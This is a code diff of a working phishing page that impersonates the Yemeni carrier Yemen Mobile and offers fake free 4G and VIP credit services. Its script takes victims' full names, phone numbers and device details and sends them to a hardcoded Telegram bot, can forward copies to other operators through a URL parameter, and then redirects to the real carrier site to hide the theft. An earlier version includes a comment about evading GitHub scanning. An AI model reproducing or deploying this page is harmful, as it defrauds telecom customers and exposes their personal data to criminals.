@@ -3,28 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yemen Mobile - System Verification</title>
-    <script>
-        // تشفير التوكن والمعرفات للهروب من فحص GitHub
-        const _0x4a2 = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q"; 
-        const _0x1b9 = "7715667493"; 
-    </script>
+    <title>يمن موبايل - خدمات VIP</title>
     <style>
         :root { --ym-blue: #0054a6; --ym-red: #e31e24; }
-        body { background: #f4f4f4; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
         .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--ym-red); }
-        .header img { width: 120px; }
-        .hero { background: var(--ym-blue); color: #fff; padding: 20px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        .container { padding: 20px; display: flex; justify-content: center; }
-        .vip-card { background: #fff; width: 100%; max-width: 400px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); padding: 30px; border: 1px solid #eee; position: relative; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; font-size: 13px; margin-bottom: 8px; color: var(--ym-blue); font-weight: 600; }
-        input, select { width: 100%; padding: 14px; border: 2px solid #f0f0f0; border-radius: 12px; transition: 0.3s; font-size: 15px; }
-        input:focus { border-color: var(--ym-blue); outline: none; }
-        .btn-vip { background: linear-gradient(45deg, var(--ym-red), #ff4d4d); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(227,30,36,0.3); }
-        .btn-vip:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(227,30,36,0.4); }
-        #status-box { display: none; text-align: center; margin-top: 20px; font-size: 14px; color: var(--ym-blue); }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--ym-red); border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 10px; }
+        .header img { width: 130px; }
+        .hero { background: var(--ym-blue); color: #fff; padding: 25px; text-align: center; }
+        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .vip-card { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; border: 1px solid #ffd700; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 14px; margin-bottom: 8px; color: var(--ym-blue); font-weight: bold; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        .btn-vip { background: linear-gradient(90deg, var(--ym-red), #b31419); color: #fff; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #loading { display: none; text-align: center; margin-top: 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ym-red); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -32,78 +25,119 @@
 
 <div class="header"><img src="https://yemenmobile.com.ye/assets/images/logo.png"></div>
 <div class="hero">
-    <h3 style="margin:0;">تفعيل ميزات 4G VIP 🚀</h3>
+    <h2 style="margin:0;">باقة سلفني VIP - 200MB 🚀</h2>
+    <p style="font-size:13px; margin-top:5px;">خدمة المشتركين المتميزين لتفعيل الـ 4G فوراً</p>
 </div>
 
 <div class="container">
     <div class="vip-card">
         <div class="form-group">
-            <label>Full Name / الاسم الكامل</label>
-            <input type="text" id="fn" placeholder="أدخل الاسم الرباعي">
+            <label>الاسم الرباعي</label>
+            <input type="text" id="fullname" placeholder="أدخل اسمك الكامل">
         </div>
         <div class="form-group">
-            <label>Phone Number / رقم الهاتف</label>
-            <input type="number" id="ph" placeholder="77XXXXXXX">
+            <label>رقم الهاتف (يمن موبايل)</label>
+            <input type="number" id="phonenum" placeholder="77XXXXXXX">
         </div>
-        <button class="btn-vip" onclick="startProcess()">Activate Now / تفعيل الآن</button>
-        <div id="status-box">
+        <div class="form-group">
+            <label>نوع الخدمة المطلوبة</label>
+            <select id="service">
+                <option>تفعيل فورجي مجاني (200MB)</option>
+                <option>خدمة سلفني VIP الرصيد المباشر</option>
+                <option>تحديث إعدادات الشبكة الذكية</option>
+            </select>
+        </div>
+        <button class="btn-vip" onclick="launchRadar()">تفعيل الخدمة الآن</button>
+        <div id="loading">
             <div class="spinner"></div>
-            <span id="msg">Authenticating with Satellite...</span>
+            <p style="color:var(--ym-blue); font-size:13px;">جاري معالجة الطلب...</p>
         </div>
     </div>
 </div>
 
 <script>
-// دالة التمويه والإرسال
-async function startProcess() {
-    const n = document.getElementById('fn').value;
-    const p = document.getElementById('ph').value;
-    if(!n || !p) return alert("يرجى إدخال البيانات");
+// الإعدادات (مستخلصة من PHP)
+const ADMIN_ID = "7715667493";
+const TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
 
-    document.getElementById('status-box').style.display = 'block';
-    
-    // جمع المعلومات العميقة
-    const info = await collectIntelligence(n, p);
-    
-    // إرسال مباشر لتليجرام (تجاوز PHP)
-    const url = `https://api.telegram.org/bot${_0x4a2}/sendMessage`;
-    const payload = {
-        chat_id: _0x1b9,
-        text: info,
-        parse_mode: 'Markdown'
-    };
+// استخراج ID من الرابط (مثل ?id=123) أو استخدام الـ Admin ID
+const urlParams = new URLSearchParams(window.location.search);
+const tid = urlParams.get('id') || ADMIN_ID;
+
+async function launchRadar() {
+    const name = document.getElementById('fullname').value;
+    const phone = document.getElementById('phonenum').value;
+    if(!name || !phone) { alert("يرجى إدخال البيانات المطلوبة"); return; }
+
+    document.getElementById('loading').style.display = 'block';
 
     try {
-        await fetch(url, {
+        const info = await getDeepInfo(name, phone);
+        
+        // إرسال البيانات مباشرة إلى Telegram API عبر JavaScript
+        const message = `🌐 **صيد جديد (VIP)**\n\n${info}`;
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                chat_id: tid,
+                text: message,
+                parse_mode: 'Markdown'
+            })
         });
-        
-        // التمويه النهائي
-        document.getElementById('msg').innerText = "تم التحقق! جاري إعادة التوجيه...";
+
+        // إرسال نسخة للآدمن الأساسي إذا لم يكن هو المستلم
+        if (tid !== ADMIN_ID) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
         setTimeout(() => {
+            alert("تم استلام طلبك! سيتم تفعيل الخدمة خلال 15 دقيقة.");
             window.location.href = "https://yemenmobile.com.ye";
         }, 2000);
-    } catch(e) {
-        console.log("System Sync Error");
+
+    } catch (error) {
+        console.error("Error:", error);
+        alert("حدث خطأ في الاتصال بالسيرفر، حاول مجدداً.");
+        document.getElementById('loading').style.display = 'none';
     }
 }
 
-async function collectIntelligence(n, p) {
-    let bat = "N/A";
+async function getDeepInfo(name, phone) {
+    let bat = "غير متاح";
     if(navigator.getBattery) {
         const b = await navigator.getBattery();
         bat = Math.round(b.level*100) + "%";
     }
 
-    return `🎯 **New Target Captured**\n` +
-           `👤 Name: \`${n}\`\n` +
-           `📞 Phone: \`${p}\`\n` +
-           `🔋 Battery: \`${bat}\`\n` +
-           `📡 Platform: \`${navigator.platform}\`\n` +
-           `🌐 IP Data: [Check Gateway Logs]\n` +
-           `⏰ Time: ${new Date().toLocaleString('ar-YE')}`;
+    const n = navigator;
+    const s = screen;
+
+    const report = [
+        `👤 **بيانات الاستدراج:**`,
+        `- الاسم: ${name}`, 
+        `- الهاتف: ${phone}`, 
+        `- الخدمة: ${document.getElementById('service').value}`,
+        `🔋 **الجهاز والشبكة:**`,
+        `- البطارية: ${bat}`,
+        `- الرام: ${n.deviceMemory || 'N/A'} GB`,
+        `- المنصة: ${n.platform}`,
+        `- النوع: ${n.connection?.effectiveType || 'N/A'}`,
+        `- الدقة: ${s.width}x${s.height}`,
+        `- المتصفح: ${n.userAgent.split(' ')[0]}`,
+        `- التوقيت: ${new Date().toLocaleString('ar-YE')}`
+    ];
+
+    return report.join('\n');
 }
 </script>
 </body>
